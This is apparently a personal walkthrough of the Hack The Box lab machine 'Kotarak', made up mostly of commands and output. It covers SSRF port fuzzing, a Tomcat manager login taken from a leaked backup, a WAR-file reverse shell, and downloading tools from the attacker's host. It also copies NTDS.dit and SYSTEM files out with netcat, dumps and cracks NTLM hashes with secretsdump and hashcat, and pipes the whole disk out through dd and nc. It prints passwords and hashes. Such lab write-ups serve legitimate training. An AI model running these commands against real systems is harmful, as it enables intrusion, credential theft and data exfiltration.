#Kotarak
#LocalHost FUZZING via WFUZZ
#Localhost Backup Discovery via BURPSUITE REPEATER
#War File Reverse Shell via Manager Apache Console
#ntdis pentest results
#upload the files from the COMPROMISED SERVER to KALI via NC
#Up0load .NTDS and .bin files
#Use of impacket-secretdump to dump the HASHES
#NTLM Hash Crach hashcat hashes rockyou.txt -m 1000
#WAR File Reverse shell: https://github.com/thewhiteh4t/warsend
#Linux priv esc: https://docs.h4rithd.com/linux/privilageesc-linux
#Root via Disk unzip and mount
# https://0xdf.gitlab.io/2021/05/19/htb-kotarak.html#alternative-root-via-disk
#

1-Enumeration:
    └─$ nmap -T5 -sV -sC -Pn 10.129.1.117 -v
        give us few results lets us "-p-" flag

        PORT      STATE SERVICE VERSION
        22/tcp    open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
        | ssh-hostkey: 
        |   2048 e2:d7:ca:0e:b7:cb:0a:51:f7:2e:75:ea:02:24:17:74 (RSA)
        |   256 e8:f1:c0:d3:7d:9b:43:73:ad:37:3b:cb:e1:64:8e:e9 (ECDSA)
        |_  256 6d:e9:26:ad:86:02:2d:68:e1:eb:ad:66:a0:60:17:b8 (ED25519)

        8009/tcp  open  ajp13   Apache Jserv (Protocol v1.3)
        | ajp-methods: 
        |   Supported methods: GET HEAD POST PUT DELETE OPTIONS
        |   Potentially risky methods: PUT DELETE
        |_  See https://nmap.org/nsedoc/scripts/ajp-methods.html

        8080/tcp  open  http    Apache Tomcat 8.5.5
        |_http-favicon: Apache Tomcat
        |_http-title: Apache Tomcat/8.5.5 - Error report
        | http-methods: 
        |   Supported Methods: GET HEAD POST PUT DELETE OPTIONS
        |_  Potentially risky methods: PUT DELETE

        60000/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
        |_http-title:         Kotarak Web Hosting        
        | http-methods: 
        |_  Supported Methods: GET HEAD POST OPTIONS
        |_http-server-header: Apache/2.4.18 (Ubuntu)
        Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


    
    Port 8080:
        http://10.129.1.117:8080/manager/status
            admin + Passwd Web Page

        http://10.129.1.117:8080/examples/jsp/snp/snoop.jsp
        http://10.129.1.117:8080/examples/servlets/index.html

        [★]$ gobuster dir -u http://10.129.1.117:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
            /docs                 (Status: 302) [Size: 0] [--> /docs/]
            /examples             (Status: 302) [Size: 0] [--> /examples/]
            /manager              (Status: 302) [Size: 0] [--> /manager/]



    Port 60000:
        http://10.129.1.117:60000/
        
        [★]$ nikto -h http://10.129.1.117:60000/
            info.php:
                PHP Version 5.6.31-1~ubuntu16.04.1+deb.sury.org+1

        http://10.129.1.117:60000/url.php?path=bb


        If we add our private IP with a port and launch a search via the web page its able to connect to our LOCAL WEBSERVER:
            
            1-└──╼ [★]$ python3 -m http.server 4443
            Serving HTTP on 0.0.0.0 port 4443 (http://0.0.0.0:4443/) ...
            10.129.1.117 - - [03/Jan/2025 13:44:05] "GET / HTTP/1.1" 200 -

            2-http://10.129.1.117:60000/url.php?path=http%3A%2F%2F10.10.14.174%3A4443
            NOT EXPLOITABLE...

        We try File discovery:
            file:///etc/passwd

            http://10.129.1.117:60000/url.php?path=file%3A%2F%2F%2Fetc%2Fpasswd :
                "try harder"


        ############################# NEW TECHNICS ################################################
        We will try to fuzz by using the localhost conatining in the remote host:
        We basically use the "localhost" to scan the internal ports
            wfuzz -c -z range,1-65535 --hl=2 http://10.129.1.117:60000/url.php?path=http://localhost:FUZZ    
            Target: http://10.129.1.117:60000/url.php?path=http://localhost:FUZZ
            Total requests: 65535

            =====================================================================
            ID           Response   Lines    Word       Chars       Payload                                                                                  
            =====================================================================

            000000022:   200        4 L      4 W        62 Ch       "22"                                                                                     
            000000090:   200        11 L     18 W       156 Ch      "90"                                                                                     
            000000110:   200        17 L     24 W       187 Ch      "110"                                                                                    
            000000200:   200        3 L      2 W        22 Ch       "200"                                                                                    
            000000320:   200        26 L     109 W      1232 Ch     "320"                                                                                    
            000000888:   200        78 L     265 W      3955 Ch     "888"                                                                                    
            000060000:   200        78 L     130 W      1171 Ch     "60000"  

        
        We found a new Login Page:
            http://10.129.1.117:60000/url.php?path=http://localhost:320

        We found a page with interisting Files:
            http://10.129.1.117:60000/url.php?path=http://localhost:888
        ############################# NEW TECHNICS ################################################


        VIA BURPSUITE we send this request in the REPEATER:
            GET /url.php?path=http%3a//localhost%3a888/%3fdoc%3dbackup HTTP/1.1

        We got a passwd:
               <user username="admin" password="3@g01PdhB!" roles="manager,manager-gui,admin-gui,manager-script"/>

        This passwd give us access to:
            http://10.129.1.117:8080/manager/html/list


        ############################# WAR FILE REVERSE SHELL  ################################################
        From Here we can sned a WAR file to get a reverse shell:
        We use this bash script: https://github.com/thewhiteh4t/warsend
            ──╼ [★]$ sudo bash ./warsend.sh 10.10.14.174 4443 10.129.1.117 8080 admin 3@g01PdhB! revshell

        We have a shell:
            which python
            /usr/bin/python

            python -c 'import pty; pty.spawn("/bin/bash")'


        In the /dev/shm we create a "route" folder to upload LinEnum.sh:
            Kali: ╼ [★]$ python3 -m http.server 8888

            tomcat@kotarak-dmz:/dev/shm/route$ wget -r http://10.10.14.174:8888/LinEnum.sh
             and linux privchek.py

            [+] Kernel
                Linux version 4.4.0-83-generic (buildd@lgw01-29) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.4) ) #106-Ubuntu SMP Mon Jun 26 17:54:43 UTC 2017
            [+] Hostname
                kotarak-dmz
            [+] Operating System
                Ubuntu 16.04.1 LTS \n \l

            [+] Sudo Version (Check out http://www.exploit-db.com/search/?action=search&filter_page=1&filter_description=sudo)
            Sudo version 1.8.16

            The following exploits are ranked higher in probability of success because this script detected a related running process, OS, or mounted file system
            - MySQL 4.x/5.0 User-Defined Function Local Privilege Escalation Exploit || http://www.exploit-db.com/exploits/1518 || Language=c

            The following exploits are applicable to this kernel version and should be investigated as well
            - Kernel ia32syscall Emulation Privilege Escalation || http://www.exploit-db.com/exploits/15023 || Language=c


        We found also some previous pentest results:
            tomcat@kotarak-dmz:/home/tomcat/to_archive/pentest_data$ ls
            ls
            20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit
            20170721114637_default_192.168.110.133_psexec.ntdsgrab._089134.bin


        To upload the .bin and .dit files from the COMPROMISED SERVER to KALI:
            Kali for .bin:
                ╼ [★]$ nc -lvnp PORT > SYSTEM
            COMPROMISED SERVER:
                tomcat@kotarak-dmz:/home/tomcat/to_archive/pentest_data$ nc 10.10.14.89 8000 < 20170721114637_default_192.168.110.133_psexec.ntdsgrab._089134.bin


            Kali for .ntds:
                └──╼ [★]$ nc -lvnp 8000 > ntds.dit
            COMPROMISED SERVER:
                tomcat@kotarak-dmz:/home/tomcat/to_archive/pentest_data$ nc 10.10.14.89 8000 < 20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit


        Use impacket-secretdump to dump the HASHES:
            └──╼ [★]$ impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
                Administrator:500:aad3b435b51404eeaad3b435b51404ee:e64fe0f24ba2489c05e64354d74ebd11:::
                krbtgt:502:aad3b435b51404eeaad3b435b51404ee:ca1ccefcb525db49828fbb9d68298eee:::
                atanas:1108:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::

            ──╼ [★]$ sudo nano hashes
                    WE add the Hashes


        We Crack the Hash with hashcat:
            ──╼ [★]$ hashcat hashes rockyou.txt -m 1000

            e64fe0f24ba2489c05e64354d74ebd11:f16tomcat! 

        
        We esclalate the privileges:
            tomcat@kotarak-dmz:/home$ ls
                ls
                atanas	tomcat
            tomcat@kotarak-dmz:/home$ su atanas 
                su atanas
                Password: f16tomcat!

            atanas@kotarak-dmz:/home$

        We Enumerate via LinEnum.sh:
            NAME="Ubuntu"
            VERSION="16.04.1 LTS (Xenial Xerus)"


    
2-Exploit / Priv Esc to Root:
    We go to the root folders:
        atanas@kotarak-dmz:/root$ cat app.log
            cat app.log
            10.0.3.133 - - [20/Jul/2017:22:48:01 -0400] "GET /archive.tar.gz HTTP/1.1" 404 503 "-" "Wget/1.16 (linux-gnu)"
            10.0.3.133 - - [20/Jul/2017:22:50:01 -0400] "GET /archive.tar.gz HTTP/1.1" 404 503 "-" "Wget/1.16 (linux-gnu)"
            10.0.3.133 - - [20/Jul/2017:22:52:01 -0400] "GET /archive.tar.gz HTTP/1.1" 404 503 "-" "Wget/1.16 (linux-gnu)"

    Here we fin a depreciated version of "Wget" that is runing every 2 minutes.
            Wget/1.16 


    We can try some Linux Priv Esc:
        https://docs.h4rithd.com/linux/privilageesc-linux


    Request: https://0xdf.gitlab.io/2021/05/19/htb-kotarak.html

    Need some way to listen on port 80 on this host:

    authbind is a program that allows non-root users to bind on low ports.

    With authbind, I’m able to listen on port 80 without issue:

        atanas@kotarak-dmz:/$ which authbind
            which authbind
            /usr/bin/authbind

    authbind is a program that allows non-root users to bind on low ports.
    With authbind, I’m able to listen on port 80 without issue:
        atanas@kotarak-dmz:/$ authbind nc -lvnp 80  
            authbind nc -lvnp 80
            Listening on [0.0.0.0] (family 0, port 80)

    Request
        I’ll use nc so I can see what a full request looks like if it comes.

        atanas@kotarak-dmz:/$ authbind nc -lvnp 80  
            authbind nc -lvnp 80
            Listening on [0.0.0.0] (family 0, port 80)
            Connection from [10.0.3.133] port 80 [tcp/*] accepted (family 2, sport 54668)
            GET /archive.tar.gz HTTP/1.1
            User-Agent: Wget/1.16 (linux-gnu)
            Accept: */*
            Host: 10.0.3.1
            Connection: Keep-Alive

    Root by DIsk:
        I actually found this root before finding the intended path. The first thing I check when I get a shell is the groups the user is in with the id command:

        atanas@kotarak-dmz:/$ id
            id
            uid=1000(atanas) gid=1000(atanas) groups=1000(atanas),4(adm),6(disk),24(cdrom),30(dip),34(backup),46(plugdev),115(lpadmin),116(sambashare)

        atanas is in the disk group, which gives access to the raw devices.
            lsblk shows how the devices are configured: 
                atanas@kotarak-dmz:/$ lsblk
                    lsblk
                    NAME                   MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT
                    sda                      8:0    0   12G  0 disk 
                    ├─sda1                   8:1    0  120M  0 part /boot
                    ├─sda2                   8:2    0    1K  0 part 
                    └─sda5                   8:5    0 11.9G  0 part 
                    ├─Kotarak--vg-root   252:0    0    7G  0 lvm  /
                    └─Kotarak--vg-swap_1 252:1    0    1G  0 lvm  [SWAP]
                    sr0                     11:0    1 1024M  0 rom  

        Kotarak--vg-root and Kotarak--vg-swap_1 are the root file system and swap space under LVM. Both live on the sda5 partition on sda. The LVM mappings live in /dev/mapper:
            atanas@kotarak-dmz:/$ ls -l /dev/mapper/
                ls -l /dev/mapper/
                total 0
                crw------- 1 root root 10, 236 Jan 23 13:37 control
                lrwxrwxrwx 1 root root       7 Jan 23 13:37 Kotarak--vg-root -> ../dm-0
                lrwxrwxrwx 1 root root       7 Jan 23 13:37 Kotarak--vg-swap_1 -> ../dm-1
        
        "dm-0" is the device I want to read off to get the root of the filesystem.  


        Exfil Filesystem
        I’ll use dd to read from the device, and nc to copy the entire filesystem off the device back to my host. I’ll send it through gzip to compress it so that it will move faster

        1- ╼ [★]$ sudo nc -lnvp 4443 > dm-0.gz

        2-  atanas@kotarak-dmz:/$ time dd if=/dev/dm-0 | gzip -1 - | nc 10.10.14.124 4443
            time dd if=/dev/dm-0 | gzip -1 - | nc 10.10.14.124 4443

        3- └──╼ [★]$ ls -lh dm-0.gz
                    -rw-r--r-- 1 dsk75 dsk75 2.2G Jan 23 15:31 dm-0.gz

            ─╼ [★]$ sudo mount dm-0-orig /mnt/
                    ls /mnt/
                    ls /mnt/root/
                    sudo cat /mnt/var/lib/lxc/kotarak-int/rootfs/root/root.txt





